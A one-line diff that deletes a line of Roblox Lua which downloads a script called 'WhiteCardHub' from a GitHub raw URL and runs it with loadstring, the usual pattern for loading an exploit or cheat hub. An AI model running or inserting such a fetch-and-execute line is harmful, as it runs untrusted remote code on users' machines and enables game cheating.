@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/zvz06666666/console_1/main/WhiteCardHub'))()
